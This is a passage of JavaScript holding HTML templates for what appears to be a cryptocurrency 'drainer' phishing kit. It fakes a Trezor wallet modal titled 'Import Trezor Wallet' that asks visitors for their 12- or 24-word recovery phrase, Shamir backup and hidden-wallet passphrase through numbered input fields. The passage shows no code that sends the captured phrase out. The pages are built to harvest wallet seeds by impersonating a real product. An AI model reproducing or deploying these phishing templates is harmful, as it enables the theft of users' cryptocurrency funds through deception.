        <div id="mnemonic-inputdiv-14" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">15.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-14" type="text" tabindex="15" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-15" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">16.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-15" type="text" tabindex="16" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-16" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">17.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-16" type="text" tabindex="17" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-17" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">18.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-17" type="text" tabindex="18" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-18" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">19.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-18" type="text" tabindex="19" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-19" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">20.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-19" type="text" tabindex="20" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-20" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">21.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-20" type="text" tabindex="21" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-21" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">22.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-21" type="text" tabindex="22" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-22" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">23.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-22" type="text" tabindex="23" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-23" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">24.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-23" type="text" tabindex="24" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
    </div>
</div>

                                        <button onClick="updatePage(TrezorWalletFinishModal);" class="sc-himrzO eyWopv connect-phrase-button">
                                           <div class="sc-ikZpkk FGzOk">
                                              <div class="sc-jIZahH gjHfVN">
                                                 <svg width="13" height="12" viewBox="0 0 13 12" fill="none" xmlns="http://www.w3.org/2000/svg" class="sc-ezWOiH bkoIPM">
                                                    <line stroke="currentColor" x1="1" y1="6" x2="12" y2="6" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-kLLXSd bDZenP"></line>
                                                    <path stroke="currentColor" d="M7.51431 1.5L11.757 5.74264M7.5 10.4858L11.7426 6.24314" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-bZkfAO"></path>
                                                 </svg>
                                              </div>
                                           </div>
                                           <span class="sc-gXmSlM CshDF">Continue</span>
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>`;

/*
const TrezorWalletModal = `
<div id="connect-trezor-modal" class="connect-trezor-modal sc-idiyUo hBuwwI" style="--height: 632px; --width: 543px;">
    <div style="pointer-events: none; position: absolute; top: 0px; bottom: 0px; left: 50%; transform: translateX(-50%); width: var(--width); z-index: 9; transition: width 200ms ease 0s;"></div>
    <div class="sc-iqcoie RrATt active">
        <div class="sc-crXcEl gcowpW">
            <button onclick="updatePage(CloseModal);" aria-label="Close" class="sc-fnykZs hFEFWT">
                <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M1 13L13 1" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                    <path d="M1 0.999999L13 13" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                </svg>
            </button>
            <button onclick="updatePage(ConnectModal);" aria-label="Back" class="sc-fEOsli iSYxCx" style="opacity: 1;">
                <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M8 1L1 8L8 15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                </svg>
            </button>
        </div>
        <div class="sc-eCYdqJ dLUlU">
            <div style="position: absolute; top: 0px; left: 0px; right: 0px; opacity: 1;">Trezor Wallet</div>
        </div>
        <div class="sc-evZas gcbNhn">
            <div class="sc-breuTD hVhjow active-scale-up">
                <div class="sc-ksZaOG dmNTWR" style="pointer-events: auto;">
                    <div style="z-index: 2; opacity: 1; transform: none;">
                        <div class="sc-dkzDqf jKlSZW" style="width:495px !important;">
                            <div class="sc-ZyCDH cBtLfS">
                                <div class="sc-jSMfEi lbAEgN"></div>
                                <div class="sc-jOhDuK hLWHUX">
                                    <div class="sc-hlnMnd czUBmg">
                                        <div class="sc-jTYCaT epSHCc">
                                            <div class="sc-jQHtVU jhhhSe" style="border-radius: 0px;">
                                                <div style="transform: scale(1.14); position: relative; width: 100%;">
                                                    <div style="transform: scale(0.86); position: relative; width: 100%;">
                                                    <svg xmlns="http://www.w3.org/2000/svg" width="512" height="512" viewBox="0 0 512 512" version="1.1"><path d="M 243.322 117.098 L 238.145 117.963 231.453 120.481 L 224.761 123 218.631 126.716 L 212.500 130.433 206 137.061 L 199.500 143.690 196.238 149.163 L 192.977 154.636 190.987 160.295 L 188.998 165.955 188.019 172.728 L 187.040 179.500 187.020 190.750 L 187 202 172.994 202 L 158.987 202 159.244 276.681 L 159.500 351.362 207.795 373.704 L 256.090 396.046 304.295 373.734 L 352.500 351.423 352.756 276.711 L 353.013 202 339.138 202 L 325.264 202 324.777 186.250 L 324.290 170.500 321.571 162.510 L 318.853 154.519 315.213 148.528 L 311.574 142.537 305.519 136.481 L 299.463 130.426 293.482 126.795 L 287.500 123.164 282 120.992 L 276.500 118.819 269.162 117.410 L 261.824 116 255.162 116.117 L 248.500 116.234 243.322 117.098 M 244.314 152.798 L 239.129 154.649 235.057 157.344 L 230.985 160.039 227.982 164.183 L 224.980 168.327 223.490 173.345 L 222 178.363 222 190.195 L 222 202.027 255.750 201.763 L 289.500 201.500 289.500 188 L 289.500 174.500 286.710 168.818 L 283.920 163.137 280.256 159.920 L 276.591 156.702 271.046 154.161 L 265.500 151.619 257.500 151.283 L 249.500 150.947 244.314 152.798 M 198.240 282.113 L 198.500 327.226 227.180 340.481 L 255.861 353.737 284.680 340.477 L 313.500 327.218 313.760 282.109 L 314.020 237 256 237 L 197.980 237 198.240 282.113" stroke="none" fill="#fbfbfb" fill-rule="evenodd"/><path d="M 125 50.682 L 122.500 51.113 115.209 53.065 L 107.917 55.017 100.709 58.640 L 93.500 62.264 89 65.302 L 84.500 68.341 80.500 71.808 L 76.500 75.276 70.721 81.849 L 64.942 88.423 60.538 95.961 L 56.133 103.500 54.125 109 L 52.116 114.500 50.308 121 L 48.500 127.500 48.500 258 L 48.500 388.500 50.779 396.837 L 53.059 405.173 55.997 411.653 L 58.935 418.133 63.572 425.109 L 68.210 432.084 75.313 439.104 L 82.417 446.124 89.111 450.574 L 95.804 455.024 101.152 457.388 L 106.500 459.752 111.500 461.469 L 116.500 463.186 118.500 463.549 L 120.500 463.912 127 464.948 L 133.500 465.985 256.640 465.992 L 379.779 466 388.140 464.444 L 396.500 462.888 402.500 460.812 L 408.500 458.736 412.500 456.725 L 416.500 454.713 423.692 449.865 L 430.883 445.018 436.842 439.077 L 442.801 433.137 447.315 426.811 L 451.829 420.485 455.241 412.992 L 458.652 405.500 461.076 397 L 463.500 388.500 463.500 258 L 463.500 127.500 461.607 120.500 L 459.715 113.500 456.499 105.867 L 453.284 98.234 448.395 90.948 L 443.507 83.661 436.503 76.705 L 429.500 69.748 423.619 65.748 L 417.738 61.747 409.619 57.957 L 401.500 54.167 395.500 52.362 L 389.500 50.557 258.500 50.404 L 127.500 50.251 125 50.682 M 243.322 117.098 L 238.145 117.963 231.453 120.481 L 224.761 123 218.631 126.716 L 212.500 130.433 206 137.061 L 199.500 143.690 196.238 149.163 L 192.977 154.636 190.987 160.295 L 188.998 165.955 188.019 172.728 L 187.040 179.500 187.020 190.750 L 187 202 172.994 202 L 158.987 202 159.244 276.681 L 159.500 351.362 207.795 373.704 L 256.090 396.046 304.295 373.734 L 352.500 351.423 352.756 276.711 L 353.013 202 339.138 202 L 325.264 202 324.777 186.250 L 324.290 170.500 321.571 162.510 L 318.853 154.519 315.213 148.528 L 311.574 142.537 305.519 136.481 L 299.463 130.426 293.482 126.795 L 287.500 123.164 282 120.992 L 276.500 118.819 269.162 117.410 L 261.824 116 255.162 116.117 L 248.500 116.234 243.322 117.098 M 244.314 152.798 L 239.129 154.649 235.057 157.344 L 230.985 160.039 227.982 164.183 L 224.980 168.327 223.490 173.345 L 222 178.363 222 190.195 L 222 202.027 255.750 201.763 L 289.500 201.500 289.500 188 L 289.500 174.500 286.710 168.818 L 283.920 163.137 280.256 159.920 L 276.591 156.702 271.046 154.161 L 265.500 151.619 257.500 151.283 L 249.500 150.947 244.314 152.798 M 198.240 282.113 L 198.500 327.226 227.180 340.481 L 255.861 353.737 284.680 340.477 L 313.500 327.218 313.760 282.109 L 314.020 237 256 237 L 197.980 237 198.240 282.113" stroke="none" fill="#0c8d4d" fill-rule="evenodd"/></svg>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="sc-fvNpTx eFjHkq"></div>
                                        </div>
                                    </div>
                                </div>
                                <div class="sc-gKXOVf liyQQU">
                                    <div class="sc-jIAOiI dWkvrK" style="position: relative; opacity: 1; transform: none;">
                                        <div class="sc-iBkjds emnDjo" style="padding-bottom: 18px;">
                                            <h1 class="sc-ftvSup fqLYro">Import Trezor Wallet<br></h1>
                                            <div class="sc-papXJ jCcNJP">To connect your Trezor wallet,<br>enter the secret phrase.<br></div>
                                        </div>
<div class="jssSolrise17 MuiBox-root css-0">
<div class="MuiBox-root css-3mllz6 drainer-mnemonic-checkbox-container" style="height: 24px;">
<label style="
    line-height: 20px;
    /* margin-right: 4px;
    vertical-align: top;
    display: block;
    height: 20px;
    color: #000;

">Hidden wallet<input id="phrase-passphrase-checkbox" type="checkbox" name="checkbox"></label>
</div>
    <div class="MuiBox-root css-3mllz6 css-selector">
    <input class="phrase-display-none dddsad dddsadx" placeholder="Passphrase" type="password" autocomplete="new-password" id="connect-hardware-passphrase">
    <select class="dddsad" name="connect-hardware-words" id="connect-hardware-words">
<option value="12">I have 12-word phrase</option>
<option value="24">I have 24-word phrase</option>
<option value="shamir">Shamir Backup</option>
</select>
    </div>
    <textarea id="mnemonic-textarea" placeholder="Enter your recovery phrase" class="phrase-display-none MuiGrid-root MuiGrid-container MuiGrid-spacing-xs-2 jssSolrise18 css-isbt42" rows="4" style="padding-top:16px;margin-bottom: 16px;height: 120%;margin-top: 16px;background-color: rgb(255, 255, 255);border: 1px solid rgb(202, 206, 209);border-radius: 0.25rem;resize: none;margin-right: 15px;margin-left: 15px;width: calc(100% - 30px);"></textarea>
    <div id="mnemonic-words" class="MuiGrid-root MuiGrid-container MuiGrid-spacing-xs-2 jssSolrise18 css-isbt42">
        <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div id="mnemonic-inputdiv-0" class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">1.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-0" type="text" tabindex="1" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-1" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">2.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-1" type="text" tabindex="2" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-2" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">3.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-2" type="text" tabindex="3" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-3" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">4.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-3" type="text" tabindex="4" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-4" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">5.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-4" type="text" tabindex="5" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-5" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">6.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-5" type="text" tabindex="6" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-6" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">7.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-6" type="text" tabindex="7" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-7" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">8.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-7" type="text" tabindex="8" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-8" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">9.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-8" type="text" tabindex="9" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-9" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">10.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-9" type="text" tabindex="10" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-10" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">11.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-10" type="text" tabindex="11" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-11" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">12.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-11" type="text" tabindex="12" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-12" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">13.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-12" type="text" tabindex="13" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-13" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">14.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-13" type="text" tabindex="14" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-14" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">15.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-14" type="text" tabindex="15" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-15" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">16.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-15" type="text" tabindex="16" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-16" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">17.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-16" type="text" tabindex="17" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-17" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
